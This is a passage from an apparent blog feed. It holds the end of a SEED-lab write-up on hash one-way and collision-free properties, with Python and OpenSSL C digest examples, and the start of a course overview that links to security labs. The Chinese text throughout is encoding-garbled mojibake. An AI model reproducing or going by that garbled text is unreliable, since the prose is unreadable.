fb053f5c08e90c03a38b470476a61991<br></code></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬è®¡ç®—ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compare_strings</span>(<span class="hljs-params">a, b</span>):</span><br>  <span class="hljs-comment"># å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ºç©ºï¼Œå°±è¿”å›0</span><br>  <span class="hljs-keyword">if</span> a <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>  <span class="hljs-comment"># å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸ç­‰ï¼Œå°±è¿”å›0</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) != <span class="hljs-built_in">len</span>(b):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>  <span class="hljs-comment"># åˆå§‹åŒ–è®¡æ•°å™¨</span><br>  count = <span class="hljs-number">0</span><br>  <span class="hljs-comment"># ä½¿ç”¨forå¾ªç¯éå†ä¸¤ä¸ªå­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-comment"># å¦‚æœå­—ç¬¦ç›¸ç­‰ï¼Œå°±æŠŠè®¡æ•°å™¨åŠ ä¸€</span><br>    <span class="hljs-keyword">if</span> a[i] == b[i]:<br>      count += <span class="hljs-number">1</span><br>  <span class="hljs-comment"># è¿”å›è®¡æ•°å™¨çš„å€¼</span><br>  <span class="hljs-keyword">return</span> count<br><br><span class="hljs-comment"># æµ‹è¯•ä»£ç </span><br>a = <span class="hljs-string">&quot;b026324c6904b2a9cb4b88d6d61c81d1&quot;</span><br>b = <span class="hljs-string">&quot;fb053f5c08e90c03a38b470476a61991&quot;</span><br><span class="hljs-built_in">print</span>(compare_strings(a, b))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a)-compare_strings(a, b))<br></code></pre></td></tr></table></figure><p>å‘½ä»¤è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">philo@DESKTOP-0MMJKEF:~$ vim 1.py<br>philo@DESKTOP-0MMJKEF:~$ sudo chmod +x 1.py<br>[sudo] password for philo:&#x27;<br>philo@DESKTOP-0MMJKEF:~$ python3 ./1.py<br>5 <br>27<br>philo@DESKTOP-0MMJKEF:~$<br></code></pre></td></tr></table></figure><p>å‘ç°å³ä½¿ä»…ä»…æ”¹å˜äº†ä¸€ä¸ªbitï¼Œç”Ÿæˆçš„å“ˆå¸Œå€¼ä¹Ÿæœ‰å¾ˆå¤§çš„æ”¹å˜</p><h1 id="Task-4-One-Way-Property-versus-Collision-Free-Property"><a href="#Task-4-One-Way-Property-versus-Collision-Free-Property" class="headerlink" title="Task 4: One-Way Property versus Collision-Free Property"></a>Task 4: One-Way Property versus Collision-Free Property</h1><p><strong>æ•£åˆ—å‡½æ•°çš„å•å‘æ€§å’Œæ— ç¢°æ’æ€§çš„è›®åŠ›ç ´è§£</strong></p><p>æ•£åˆ—å‡½æ•°æ˜¯ä¸€ç§å°†ä»»æ„é•¿åº¦çš„è¾“å…¥æ˜ å°„åˆ°å›ºå®šé•¿åº¦çš„è¾“å‡ºçš„å‡½æ•°ï¼Œé€šå¸¸ç”¨äºéªŒè¯æ¶ˆæ¯çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚æ•£åˆ—å‡½æ•°å…·æœ‰ä¸¤ä¸ªé‡è¦çš„å±æ€§ï¼š</p><ul><li>å•å‘æ€§</li><li>æ— ç¢°æ’æ€§ï¼šå¾ˆéš¾æ‰¾åˆ°ä¸¤ä¸ªä¸åŒçš„è¾“å…¥ï¼Œä½¿å¾—æ•£åˆ—å‡½æ•°å¯¹å®ƒä»¬äº§ç”Ÿç›¸åŒçš„æ•£åˆ—å€¼ã€‚</li></ul><p>åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨è›®åŠ›æ–¹æ³•æ¥æ¢ç©¶ç ´åè¿™ä¸¤ä¸ªå±æ€§æ‰€éœ€çš„æ—¶é—´ã€‚è›®åŠ›æ–¹æ³•å°±æ˜¯å°è¯•æ‰€æœ‰å¯èƒ½çš„è¾“å…¥ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„è¾“å…¥ä¸ºæ­¢ã€‚</p><p>ä¸ºäº†å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ C è¯­è¨€ç¼–å†™ç¨‹åºï¼Œè°ƒç”¨ openssl åŠ å¯†åº“ä¸­çš„æ¶ˆæ¯æ‘˜è¦å‡½æ•°ã€‚æ¶ˆæ¯æ‘˜è¦å‡½æ•°æ˜¯ä¸€ç§å¸¸ç”¨çš„æ•£åˆ—å‡½æ•°ï¼Œä¾‹å¦‚ MD5 å’Œ SHA-1ã€‚æˆ‘ä»¬å¯ä»¥ä» <a href="http://www.openssl.org/docs/crypto/evp_digestinit.html">http://www.openssl.org/docs/crypto/evp_digestinit.html</a> ä¸­æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦ç†Ÿæ‚‰è¿™ä¸ªç¤ºä¾‹ä»£ç ï¼Œå¹¶æ ¹æ®æˆ‘ä»¬çš„éœ€æ±‚è¿›è¡Œä¿®æ”¹ã€‚</p><p>ç”±äºç°ä»£çš„æ•£åˆ—å‡½æ•°éƒ½è®¾è®¡å¾—å¾ˆå¼ºå¤§ï¼Œå¯¹å®ƒä»¬è¿›è¡Œè›®åŠ›ç ´è§£éœ€è¦èŠ±è´¹å¾ˆé•¿çš„æ—¶é—´ã€‚ä¸ºäº†ç®€åŒ–ä»»åŠ¡ï¼Œæˆ‘ä»¬å°†åªä½¿ç”¨æ•£åˆ—å€¼çš„å‰ 24 ä½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç›¸å½“äºä½¿ç”¨äº†ä¸€ä¸ªä¿®æ”¹è¿‡çš„æ•£åˆ—å‡½æ•°ï¼Œå®ƒçš„è¾“å‡ºé•¿åº¦åªæœ‰ 24 ä½ã€‚è¯·æ³¨æ„ï¼Œè¿™æ ·åšä¼šé™ä½æ•£åˆ—å‡½æ•°çš„å®‰å…¨æ€§ï¼Œå¹¶ä¸é€‚ç”¨äºå®é™…åœºæ™¯ã€‚</p><p>è¯·è®¾è®¡å¹¶å®ç°ä¸€ä¸ªå®éªŒï¼Œå›ç­”ä»¥ä¸‹é—®é¢˜ï¼š</p><ol><li>ç”¨è›®åŠ›æ³•ç ´åå•å‘æ€§éœ€è¦å¤šå°‘æ¬¡è¯•éªŒï¼Ÿä½ åº”è¯¥å¤šæ¬¡é‡å¤ä½ çš„å®éªŒï¼Œå¹¶æŠ¥å‘Šä½ çš„å¹³å‡è¯•éªŒæ¬¡æ•°ã€‚</li><li>ç”¨è›®åŠ›æ³•ç ´åæ— ç¢°æ’æ€§éœ€è¦å¤šå°‘æ¬¡è¯•éªŒï¼ŸåŒæ ·ï¼Œä½ åº”è¯¥æŠ¥å‘Šä½ çš„å¹³å‡è¯•éªŒæ¬¡æ•°ã€‚</li><li>æ ¹æ®ä½ çš„è§‚å¯Ÿï¼Œä½¿ç”¨è›®åŠ›æ³•æ›´å®¹æ˜“ç ´åå“ªä¸ªå±æ€§ï¼Ÿ</li><li>(10ä¸ªåŠ åˆ†)ä½ èƒ½ç”¨æ•°å­¦æ–¹æ³•è§£é‡Šä½ è§‚å¯Ÿåˆ°çš„å·®å¼‚å—ï¼Ÿ</li></ol><p>å…ˆçœ‹ä¸€ä¸‹ç¤ºä¾‹çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/evp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    EVP_MD_CTX *mdctx; <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯æ‘˜è¦ä¸Šä¸‹æ–‡å¯¹è±¡</span><br>    <span class="hljs-keyword">const</span> EVP_MD *md; <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯æ‘˜è¦ç®—æ³•å¯¹è±¡</span><br>    <span class="hljs-keyword">char</span> mess1[] = <span class="hljs-string">&quot;Test Message\n&quot;</span>; <span class="hljs-comment">// å®šä¹‰ç¬¬ä¸€ä¸ªè¾“å…¥æ•°æ®</span><br>    <span class="hljs-keyword">char</span> mess2[] = <span class="hljs-string">&quot;Hello World\n&quot;</span>; <span class="hljs-comment">// å®šä¹‰ç¬¬äºŒä¸ªè¾“å…¥æ•°æ®</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> md_value[EVP_MAX_MD_SIZE]; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ¥å­˜å‚¨è¾“å‡ºç»“æœ</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> md_len, i; <span class="hljs-comment">// å®šä¹‰ä¸¤ä¸ªæ— ç¬¦å·æ•´æ•°ï¼Œç”¨æ¥å­˜å‚¨è¾“å‡ºç»“æœçš„é•¿åº¦å’Œå¾ªç¯å˜é‡</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// å¦‚æœæ²¡æœ‰ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°ï¼Œå°±æ‰“å°ç”¨æ³•æç¤ºå¹¶é€€å‡º</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: mdtest digestname\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    md = EVP_get_digestbyname(argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">// æ ¹æ®å‘½ä»¤è¡Œå‚æ•°ï¼Œè·å–å¯¹åº”çš„æ¶ˆæ¯æ‘˜è¦ç®—æ³•</span><br>    <span class="hljs-keyword">if</span> (md == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// å¦‚æœè·å–å¤±è´¥ï¼Œå°±æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é€€å‡º</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown message digest %s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    mdctx = EVP_MD_CTX_new(); <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„æ¶ˆæ¯æ‘˜è¦ä¸Šä¸‹æ–‡å¯¹è±¡</span><br>    <span class="hljs-keyword">if</span> (!EVP_DigestInit_ex(mdctx, md, <span class="hljs-literal">NULL</span>)) &#123; <span class="hljs-comment">// åˆå§‹åŒ–æ¶ˆæ¯æ‘˜è¦ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ŒæŒ‡å®šä½¿ç”¨çš„ç®—æ³•å’Œå¼•æ“ï¼ˆè¿™é‡Œä¸º NULLï¼‰</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest initialization failed.\n&quot;</span>); <span class="hljs-comment">// å¦‚æœåˆå§‹åŒ–å¤±è´¥ï¼Œå°±æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é‡Šæ”¾ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç„¶åé€€å‡º</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!EVP_DigestUpdate(mdctx, mess1, <span class="hljs-built_in">strlen</span>(mess1))) &#123; <span class="hljs-comment">// æ›´æ–°æ¶ˆæ¯æ‘˜è¦ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå°†ç¬¬ä¸€ä¸ªè¾“å…¥æ•°æ®åŠ å…¥åˆ°è®¡ç®—ä¸­</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest update failed.\n&quot;</span>); <span class="hljs-comment">// å¦‚æœæ›´æ–°å¤±è´¥ï¼Œå°±æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é‡Šæ”¾ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç„¶åé€€å‡º</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!EVP_DigestUpdate(mdctx, mess2, <span class="hljs-built_in">strlen</span>(mess2))) &#123; <span class="hljs-comment">// æ›´æ–°æ¶ˆæ¯æ‘˜è¦ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå°†ç¬¬äºŒä¸ªè¾“å…¥æ•°æ®åŠ å…¥åˆ°è®¡ç®—ä¸­</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest update failed.\n&quot;</span>); <span class="hljs-comment">// å¦‚æœæ›´æ–°å¤±è´¥ï¼Œå°±æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é‡Šæ”¾ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç„¶åé€€å‡º</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!EVP_DigestFinal_ex(mdctx, md_value, &amp;md_len)) &#123; <span class="hljs-comment">// ç»“æŸæ¶ˆæ¯æ‘˜è¦è®¡ç®—ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åˆ° md_value æ•°ç»„ä¸­ï¼Œå°†é•¿åº¦å­˜å‚¨åˆ° md_len å˜é‡ä¸­</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest finalization failed.\n&quot;</span>); <span class="hljs-comment">// å¦‚æœç»“æŸå¤±è´¥ï¼Œå°±æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é‡Šæ”¾ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç„¶åé€€å‡º</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    EVP_MD_CTX_free(mdctx); <span class="hljs-comment">// é‡Šæ”¾æ¶ˆæ¯æ‘˜è¦ä¸Šä¸‹æ–‡å¯¹è±¡</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Digest is: &quot;</span>); <span class="hljs-comment">// æ‰“å°è¾“å‡ºæç¤º</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; md_len; i++) <span class="hljs-comment">// ä½¿ç”¨ for å¾ªç¯éå† md_value æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ </span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>, md_value[i]); <span class="hljs-comment">// ä»¥åå…­è¿›åˆ¶æ ¼å¼æ‰“å°æ¯ä¸ªå…ƒç´ çš„å€¼</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <span class="hljs-comment">// æ‰“å°æ¢è¡Œç¬¦</span><br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// é€€å‡ºç¨‹åº</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ä½¿ç”¨äº†opensslçš„apiã€å®ã€å‡½æ•°ã€ç»“æ„ä½“è®¡ç®—äº†è¾“å…¥æ•°æ®çš„å“ˆå¸Œå€¼ï¼Œæœ€ç»ˆè¾“å‡ºç»“æœå°±æ˜¯<code>Test Message\nHello World\n</code>è¿™ä¸ªå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼</p><p>æ³¨æ„ä¸€ä¸‹ï¼Œç¼–è¯‘çš„æ—¶å€™éœ€è¦ä½¿ç”¨<code>gcc -o mdtest1 mdtest.c -lcrypto -lssl</code>å‘½ä»¤ï¼Œè¿™æ˜¯ç”±äºéœ€è¦é“¾æ¥sslå’Œcrytptoä¸¤ä¸ªåº“</p><p><img src="https://img.gls.show/img/image-20230613010942993.png"></p><p>å›åˆ°ä¹‹å‰çš„é¢˜ç›®è¦æ±‚ï¼Œæ„Ÿè§‰ç”¨Cå¤ªéº»çƒ¦äº†ï¼Œpythonæ–¹ä¾¿ä¸€äº›ï¼Œå¯ä»¥å‚è€ƒ<a href="https://github.com/arafat1/One-Way-Property-versus-Collision-Free-Property">https://github.com/arafat1/One-Way-Property-versus-Collision-Free-Property</a></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab è¯¾ç¨‹æ¦‚è§ˆ</title>
    <link href="/p/96910bf1/"/>
    <url>/p/96910bf1/</url>
    
    <content type="html"><![CDATA[<p>GitHubä»“åº“é“¾æ¥ï¼š<a href="https://github.com/LaPhilosophie/seedlab">https://github.com/LaPhilosophie/seedlab</a><br>è®¡ç®—æœºè‡ªå­¦æŒ‡å—é“¾æ¥ï¼š<a href="https://csdiy.wiki/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/SEEDLabs/">SU SEED Labs - CSè‡ªå­¦æŒ‡å—</a></p><p><img src="/image/seed/seed2.0_vm.jpg"></p><blockquote><p>å½“ä½ åšå®Œseedlabçš„é‚£å¤©ï¼Œä¸€åˆ‡éƒ½å°†ä½œåºŸã€‚ä½ çš„æœ¬ç§‘ä½œåºŸï¼Œä½ çš„ä¸“ä¸šä½œåºŸï¼Œæ˜Ÿæ˜Ÿä½œåºŸï¼Œæœˆäº®ä½œåºŸï¼Œé“¶æ²³ç³»ä½œåºŸï¼Œå®‡å®™ä½œåºŸï¼Œä½ çš„çˆ±ä½œåºŸï¼Œä½ çš„æ¨ä½œåºŸï¼Œä½ çš„å‰åŠç”Ÿä½œåºŸï¼Œä½ çš„ç°å¥³å‹ä½œåºŸã€‚æ‚¬æ¢äº”å¹´è‹¦å­¦seedï¼Œå¤§é›ªæ·±åŸ‹åƒåœ¾æœ¬ç§‘ï¼</p></blockquote><h1 id="seedlab"><a href="#seedlab" class="headerlink" title="seedlab"></a>seedlab</h1><p><a href="https://seedsecuritylabs.org/index.html">SEED</a> é¡¹ç›®æ˜¯é›ªåŸå¤§å­¦çš„ç½‘å®‰è¯¾ç¨‹ï¼Œç”± NSF æä¾›130ä¸‡ç¾å…ƒçš„èµ„é‡‘æ”¯æŒï¼Œä¸ºç½‘å®‰æ•™è‚²å¼€å‘äº†åŠ¨æ‰‹å®è·µæ€§çš„å®éªŒç»ƒä¹ ï¼ˆç§°ä¸º SEED Labï¼‰ã€‚è¯¾ç¨‹ç†è®ºæ•™å­¦å’ŒåŠ¨æ‰‹å®è·µå¹¶é‡ï¼ŒåŒ…å«è¯¦ç»†çš„ <a href="https://github.com/seed-labs/seed-labs">å¼€æºè®²ä¹‰</a> ã€è§†é¢‘æ•™ç¨‹ã€æ•™ç§‘ä¹¦ï¼ˆè¢«å°åˆ·ä¸ºå¤šç§è¯­è¨€ï¼‰ã€å¼€ç®±å³ç”¨çš„åŸºäºè™šæ‹Ÿæœºå’Œ docker çš„æ”»é˜²ç¯å¢ƒç­‰ã€‚ç›®å‰å…¨çƒæœ‰1050å®¶ç ”ç©¶æœºæ„åœ¨ä½¿ç”¨è¯¥é¡¹ç›®ã€‚</p><p>æ¶µç›–è®¡ç®—æœºå’Œä¿¡æ¯å®‰å…¨é¢†åŸŸçš„å¹¿æ³›ä¸»é¢˜ï¼ŒåŒ…æ‹¬è½¯ä»¶å®‰å…¨ã€ç½‘ç»œå®‰å…¨ã€Web å®‰å…¨ã€æ“ä½œç³»ç»Ÿå®‰å…¨å’Œç§»åŠ¨åº”ç”¨å®‰å…¨ã€‚</p><ul><li>è¯¾ç¨‹ç½‘ç«™ï¼š<a href="https://seedsecuritylabs.org/index.html">https://seedsecuritylabs.org/index.html</a></li><li>è¯¾ç¨‹è§†é¢‘ï¼š<a href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a></li><li>è¯¾ç¨‹æ•™æï¼š<a href="https://www.handsonsecurity.net/index.html">https://www.handsonsecurity.net/index.html</a></li><li>è¯¾ç¨‹ä½œä¸šï¼šå››åå¤šä¸ªå®‰å…¨é¢†åŸŸçš„labï¼Œå®éªŒç¯å¢ƒå¯ç”±è¯¾ç¨‹æä¾›çš„å®šåˆ¶è™šæ‹Ÿæœºå’Œ docker <a href="https://seedsecuritylabs.org/labsetup.html">å¿«é€Ÿæ­å»º</a>ï¼Œå¹¶ä¸”æä¾›è¯¦ç»†çš„åŸç†è®²è§£ã€å®éªŒæŒ‡å¯¼ã€‚ä»¥ <a href="https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Setuid/">ç¼“å†²åŒºæº¢å‡ºå®éªŒ</a> ä¸ºä¾‹ï¼Œè¯¥å®éªŒå±äº <a href="https://seedsecuritylabs.org/Labs_20.04/Software/">è½¯ä»¶å®‰å…¨ä¸»é¢˜</a> ï¼Œè¿™é‡Œæ˜¯å®ƒçš„ <a href="https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Buffer_Overflow_Setuid.pdf">å®éªŒæŒ‡å¯¼</a> ï¼Œè¿™é‡Œæ˜¯å®ƒå¯¹åº”çš„ <a href="https://www.handsonsecurity.net/files/chapters/buffer_overflow_c.pdf">æ•™æå†…å®¹</a></li></ul><h2 id="Software-Security-Labs"><a href="#Software-Security-Labs" class="headerlink" title="Software Security Labs"></a>Software Security Labs</h2><table><thead><tr><th>å®éªŒåç§°</th><th>GitHubé“¾æ¥</th><th>åšå®¢é“¾æ¥</th></tr></thead><tbody><tr><td>Buffer Overflow Attack Lab(16.04)</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Buffer-Overflow%20Attack%20Lab%20%EF%BC%8816.04%EF%BC%89">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/187136b6/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Environment Variable and Set-UID Program Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Environment%20Variable%20and%20Set-UID%20Program%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/c51248f4/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Race Condition Vulnerability Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Race_Condition">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/529b2f3d/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Shellcode</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Shellcode">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/a10ed24d/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Dirty COW</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Dirty%20COW">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/495b96e/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Format-String Vulnerability Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Format-String%20Vulnerability%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/df8f6639/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Return-to-libc Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Return-to-libc%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/70d1fe8b/">åšå®¢é“¾æ¥</a></td></tr></tbody></table><h2 id="Cryptography-Labs"><a href="#Cryptography-Labs" class="headerlink" title="Cryptography Labs"></a>Cryptography Labs</h2><table><thead><tr><th>å®éªŒåç§°</th><th>GitHubé“¾æ¥</th><th>åšå®¢é“¾æ¥</th></tr></thead><tbody><tr><td>Pseudo Random Number Generation Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Pseudo%20Random%20Number%20Generation%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/c8db7269/">åšå®¢é“¾æ¥</a></td></tr><tr><td>RSA Public-Key Encryption and Signature Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/RSA%20Public-Key%20Encryption%20and%20Signature%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/383dc23/">åšå®¢é“¾æ¥</a></td></tr><tr><td>MD5 Collision Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/MD5%20Collision%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/45f7d752/">åšå®¢é“¾æ¥</a></td></tr><tr><td>One-Way-Hash-Function-and-MAC</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/One-Way%20Hash%20Function%20and%20MAC">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/ae23a610/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Public-Key Infrastructure (PKI) Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Public-Key%20Infrastructure%20(PKI)%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/135735d/">åšå®¢é“¾æ¥</a></td></tr></tbody></table><h2 id="Web-Security-Labs"><a href="#Web-Security-Labs" class="headerlink" title="Web Security Labs"></a>Web Security Labs</h2><table><thead><tr><th>å®éªŒåç§°</th><th>GitHubé“¾æ¥</th><th>åšå®¢é“¾æ¥</th></tr></thead><tbody><tr><td>Cross-site Scripting Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Cross-site%20Scripting%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/53d24de/">åšå®¢é“¾æ¥</a></td></tr><tr><td>SQL Injection Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/SQL%20Injection%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/961c048e/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Cross-site Request Forgery Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Cross-Site%20Request%20Forgery%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/cb388511/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Shellshock Vulnerability Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/shellshock">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/9eb48b8c/">åšå®¢é“¾æ¥</a></td></tr></tbody></table><h2 id="Network-Security"><a href="#Network-Security" class="headerlink" title="Network Security"></a>Network 